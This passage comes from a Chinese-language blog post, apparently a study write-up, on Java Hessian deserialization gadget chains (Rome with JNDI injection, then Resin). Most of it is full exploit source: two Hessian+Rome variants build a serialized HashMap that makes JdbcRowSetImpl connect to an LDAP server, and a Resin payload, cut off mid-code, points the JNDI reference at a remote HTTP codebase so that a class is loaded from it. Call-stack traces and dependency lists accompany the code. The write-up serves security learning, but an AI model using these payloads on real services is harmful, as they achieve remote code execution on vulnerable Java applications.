src="/post/257d1196/IMAGE20241231170108193.png" class=""><p>跟进看看</p><img src="/post/257d1196/IMAGE20241231170353815.png" class=""><p>补充一下就是这里的readObject会去继续反序列化读出来前面传入的值当作key所以后面调用链中使用hashMap 传入的key能够被触发。<br>关键点在下面的put方法中他会反序列化获取一个对象放入key的位置，在跟进put方法</p><img src="/post/257d1196/IMAGE20241231170503061.png" class=""><p>可以看到这里会调用hash方法跟进去</p><img src="/post/257d1196/IMAGE20241231170540480.png" class=""><p>这里调用里hashcode方法，在前面分析过的Rmoe链子就可以在这里使用具体调用链参考<a href="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Rome反序列化</a>这里我直接给出Payload利用的是Jndi注入的链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">// ldap url  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/hdtx58&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建JdbcRowSetImpl对象  </span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        jdbcRowSet.setDataSourceName(url);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建toStringBean对象  </span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建ObjectBean  </span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 创建HashMap  </span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span>  makeMap(objectBean, <span class="string">&quot;aaaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 序列化  </span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(fileOutputStream);  </span><br><span class="line">        hessian2Output.writeObject(hashMap);  </span><br><span class="line">        hessian2Output.close();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 反序列化  </span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(fileInputStream);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> (HashMap) hessian2Input.readObject();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还是依然是在Windows的环境下复现成功Mac下没成功不知道为啥☹️。</p><img src="/post/257d1196/IMAGE20250101165327865.png" class=""><p>这里来贴一下调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2093</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">main:<span class="number">42</span>, Hessian_Rome_Jndi (org.example)</span><br></pre></td></tr></table></figure><p>补充一个其他师傅的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome_Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);  </span><br><span class="line">        output.writeObject(o);  </span><br><span class="line">        System.out.println(bao.toString());  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> (T) o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://10.37.129.2:1389/oblxsg&quot;</span>;  </span><br><span class="line">        jdbcRowSet.setDataSourceName(url);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);  </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()  </span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);  </span><br><span class="line">        System.out.println(s);  </span><br><span class="line">        System.out.println((HashMap)deserialize(s));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.rometools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.7.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）">Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h2><p>参考：<a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a><br>搭建环境有点复杂。</p><p>这里继续写完这篇反序列化的学习，因为期末考试加上每天要打游戏所以实在是没时间写了，今天抽空写一下免得自己以后又忘记了。</p><h2 id="Resin链">Resin链</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.63<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用链也提前标注一下吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loadClass:<span class="number">85</span>, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:<span class="number">158</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getContext:<span class="number">439</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getTargetContext:<span class="number">55</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">composeName:<span class="number">180</span>, ContinuationContext (javax.naming.spi)</span><br><span class="line">toString:<span class="number">353</span>, QName (com.caucho.naming)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">577</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">1160</span>, HessianInput (com.caucho.hessian.io)</span><br><span class="line">Hessian_unserialize:<span class="number">87</span>, Hessian_Resin (com.ocean)</span><br><span class="line">main:<span class="number">43</span>, Hessian_Resin (com.ocean)</span><br></pre></td></tr></table></figure><h3 id="调用链分析">调用链分析</h3><p>先来说一下这条链子主要是通过HashMap中PutVal方法里的key.equals(k)触发XString 的equals方法。其实之前也有过了解在学习FastJson的时候</p><img src="/post/257d1196/IMAGE20250104160754479.png" class=""><p>这里会调用toSting方法而这里利用的是com.caucho.naming.QName类。看看其toString方法</p><img src="/post/257d1196/IMAGE20250104161327316.png" class=""><p>会调用一个composeName的方法，利用的是javax.naming.spi.ContinuationContext这个类</p><img src="/post/257d1196/IMAGE20250104161631606.png" class=""><p>这个方法会调用getTargetContext方法，跟进去看看</p><img src="/post/257d1196/IMAGE20250104161733694.png" class=""><p>发现这里调用了NamingManager.getContext方法，这里就比较熟悉了，分析过Jndi注入的师傅应该都有了解，这里我们在走一遍，跟进这个getContext方法。这里多说一句可以看到传入的是cpe.getResolveObj所以在后面构造的时候会使用CannotProceedException这个类的构造方法构造而已的refrence对像传入这里</p><img src="/post/257d1196/IMAGE20250104162119159.png" class=""><p>走到getObjectInstace方法中</p><img src="/post/257d1196/IMAGE20250104162237509.png" class=""><p>会调用到这个getObjectFactoryference方法</p><img src="/post/257d1196/IMAGE20250104162313983.png" class=""><p>这里就是漏洞触发点了，他会现在本地加载类，如果找不到就会去远程加载类，但是同时会判断这个codebase的值，所以会受到java的版本影响。</p><img src="/post/257d1196/IMAGE20250104170343863.png" class=""><p>来看一下网上的Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.*;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Resin</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;  </span><br><span class="line">        String codebase=<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>;  </span><br><span class="line">        String 